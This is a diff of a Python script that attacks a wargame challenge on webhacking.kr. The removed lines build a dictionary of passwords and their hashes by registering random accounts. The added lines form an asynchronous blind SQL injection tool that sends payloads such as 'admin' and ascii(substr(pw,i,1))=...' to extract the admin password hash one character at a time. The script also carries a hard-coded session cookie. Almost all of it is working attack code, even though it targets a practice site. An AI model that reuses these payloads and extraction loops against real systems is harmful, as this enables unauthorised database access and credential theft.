@@ -1,54 +1,65 @@
-import requests
+import asyncio
+import aiohttp
 import string
-import random
-
-def string_to_hex(s):
-    return ''.join(format(ord(char), '02x') for char in s)
-
-def generate_random_string(length):
-    characters = string.ascii_letters + string.digits
-    return ''.join(random.choice(characters) for _ in range(length))
 
 
 URL = "https://webhacking.kr/challenge/bonus-2/index.php"
-SESSION_ID = "1"
+SESSION_ID = "fsjfd38r8f4a723sl4tojnv75l"
 cookies = {'PHPSESSID':SESSION_ID}
-params ={'no':'2', 'id':'guest','pw':'guest'}
 data = {'uuid':'', 'pw':'1'}
+semaphore = asyncio.Semaphore(5)  # Limit concurrent requests
 
-# find the hashed password for admin
-# pw = ""
-# i = len(pw)+1
-# while True:
-#     for c in "abcdef"+string.digits:
+async def fetch(session, payload):
+    data['uuid'] = payload
+    timeout = aiohttp.ClientTimeout(total=10)  # Increase timeout duration
+    try:
+        async with session.post(URL, data=data, timeout=timeout) as response:
+            return await response.text()
+    except asyncio.TimeoutError:
+        # print(f"Timeout occurred for payload: {payload}")
+        return "timeout"  # Placeholder for timeout
 
-#         data['uuid'] = f"admin'&&left(pw,{i})like(0x{string_to_hex(pw+c)})#"
-#         response = requests.post(URL, data=data, cookies=cookies)
-#         print(c)
-#         if "Wrong" in response.text:
-#             pw += c
-#             i += 1
-#             print(pw)
-#             break
+async def find_password_length(session):
+    for length in range(1, 50):  # Adjust the range based on expected max length
+        payload = f"admin' and LENGTH(pw) like {length} -- "
+        response = await fetch(session, payload)
+        if "Wrong password!" in response:
+            print(f"Password length found: {length}")
+            return length
+    return None  # Return None if length not found
 
-# create dictionary for passwords and hashes
-# Example usage
-hash_admin = '6c9ca386a903921d7fa230ffa0ffc153'
-params = {'mode':'join'}
-output_file = open("hash_dictionary_old-22.txt", 'a')
-# write hashed passwords to file
-hashed_dict = {}
-for i in range(1000000):
+async def main():
+    async with aiohttp.ClientSession(cookies=cookies) as session:
+        # password_length = await find_password_length(session)
+        password_length = 32 # length of the HASH
+        if password_length is None:
+            print("Could not determine password length.")
+            return
+        
+        print(f"[+] Password length: {password_length}")
+        password = ""
+        i = 1
+        character_set = string.ascii_lowercase + string.digits
 
-    random_username = generate_random_string(10)
-    random_password = generate_random_string(10)
-    data['uuid'] = random_username
-    data['pw'] = random_password
-    response = requests.post(URL, data=data,params=params, cookies=cookies)
-    if "Done" in response.text:
-        response = requests.post(URL, data=data, cookies=cookies)
-        hashed_dict[random_password] = response.text.split("hash : ")[1].split("<br>")[0]
-        # print(f"{random_password} : {hashed_dict[random_password]}")        
-        output_file.write(f"{random_password} : {hashed_dict[random_password]}\n")        
+        while len(password) < password_length:
+            tasks = []
+            for c in character_set:  # Iterate through character set
+                payload = f"admin' and ascii(substr(pw,{i},1))=ascii('{c}') -- "
+                tasks.append(fetch(session, payload))
 
-output_file.close()
+                # await asyncio.sleep(0.1)  # Delay between requests
+
+            responses = await asyncio.gather(*tasks)
+
+            for index, response in enumerate(responses):
+                # print(f"[+] Response for {character_set[index]}: {response}")
+                if index < len(character_set) and "Wrong password!" in response:
+                    c = character_set[index]  # Correctly access character from character set
+                    password += c
+                    print(f"[+] Found password so far: {password.ljust(password_length, '*')}")
+                    break
+            
+            i += 1  # Move to the next character position
+
+if __name__ == "__main__":
+    asyncio.run(main())
